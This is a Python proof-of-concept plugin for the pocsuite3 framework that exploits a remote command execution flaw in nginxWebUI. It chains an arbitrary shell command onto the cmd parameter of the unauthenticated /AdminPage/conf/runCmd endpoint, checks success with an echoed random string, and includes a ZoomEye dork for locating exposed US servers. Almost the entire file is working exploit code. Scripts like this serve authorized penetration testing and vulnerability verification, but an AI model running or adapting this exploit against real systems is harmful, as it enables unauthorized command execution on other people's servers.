from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'nginxWebUI_RCE'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'app:"nginxWebUI" +country:"US"'}

    def _options(self):
        o = OrderedDict()
        o['cmd'] = OptString("id", description='The command to execute')
        return o

    def _exploit(self, param=''):
        url = urljoin(self.url, f'/AdminPage/conf/runCmd?cmd=expr%20199812440%20-%2010079%26%26{param}')
        res = requests.get(url, verify=False, timeout=5)
        logger.debug(res.text)
        return res.text

    def _verify(self):
        flag = random_str(6)

        result = {}
        param = f'echo {flag}'
        res = self._exploit(param)
        if flag in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Url'] = self.url
            result['VerifyInfo'][param] = res
            result['VerifyInfo']['flag'] = flag
        return self.parse_output(result)

    def _attack(self):
        return self._verify()


register_poc(POC)
